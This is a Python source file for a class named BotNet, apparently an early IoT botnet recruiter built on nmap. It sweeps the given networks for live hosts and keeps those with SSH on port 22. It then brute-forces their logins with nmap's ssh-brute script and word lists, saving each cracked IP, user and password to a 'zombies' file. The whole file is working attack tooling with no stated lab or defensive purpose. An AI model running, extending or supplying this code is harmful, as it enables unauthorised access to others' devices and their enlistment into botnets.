import nmap


class BotNet(object):

    def __init__(self, networks) -> None:
        self.networks = networks
        self._scanner = nmap.PortScanner()
        self._compromisedIot = []

    def dictionaryAttack(self):
        """
        Execute the dictionary attack
        :return:
        """
        vulnerableIot = self._openFile('vulnerableIot.txt', 'r')
        lines = vulnerableIot.readlines()
        for ip in lines:
            print(ip)
            self._login(ip.replace('\n', ''))

    def _login(self, ip):
        zombies = self._openFile('zombies.txt', 'w')
        self._scanner.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,'
                                                           'passdb=passwords.txt')
        if self._scanner[ip].state() == 'up':
            protocols = self._scanner[ip].all_protocols()
            if 'tcp' in protocols:
                ports = self._scanner[ip]
                try:
                    data = ports['tcp'][22]['script']['ssh-brute']
                    user, password = data.replace('\n', '').split('Accounts:')[1].split('-')[0].strip().split(':')
                    zombies.write(ip + " " + user + " " + password + '\n')
                    print(user, password, "Connected")
                except:
                    print("Not Connected")

            if 'udp' in protocols:
                ports = self._scanner[ip]
                try:
                    data = ports['udp'][22]['script']['ssh-brute']
                    user, password = data.replace('\n', '').split('Accounts:')[1].split('-')[0].strip().split(':')
                    zombies.write(ip + " " + user + " " + password + '\n')
                    print(user, password, "Connected")
                except:
                    print("Not Connected")

        zombies.close()

    def findVulnerabilities(self):
        """
        SCAN 2

        :return:
        """

        iot = self._openFile('iot.txt', 'r')
        vulnerableIot = self._openFile('vulnerableIot.txt', 'w')
        lines = iot.readlines()

        for ip_ in lines:
            ip_ = ip_.replace('\n', '')
            self._scanner.scan(ip_, '1-1024', '-v -sS')
            if self._scanner[ip_].state() == 'up':
                protocols = self._scanner[ip_].all_protocols()
                print("protocols : ", protocols)
                if 'tcp' in protocols:
                    ports = self._scanner[ip_]['tcp'].keys()
                    print("ports : ", ports)
                    if 22 in ports:
                        print(ip_)
                        vulnerableIot.write(ip_ + '\n')
                        ## TODO: Run dic attack on a separate thread

        iot.close()
        vulnerableIot.close()

    def findDevices(self):
        """
        SCAN 1

        find vulnerable IoT devices in networks
        :return:
        """
        file = self._openFile('iot.txt')
        for ip in self.networks:
            self._scanner.scan(hosts=ip, arguments='-sn')
            print(self._scanner.all_hosts())
            for newIp in self._scanner.all_hosts():
                self._compromisedIot.append(newIp)
                file.write(newIp + '\n')
                # Check for
        file.close()

    @staticmethod
    def _openFile(path, action='w'):
        try:
            return open(path, action)
        except:
            print("Something went wrong in opening file")
        finally:
            print("The 'try except' is finished")
            # TODO :
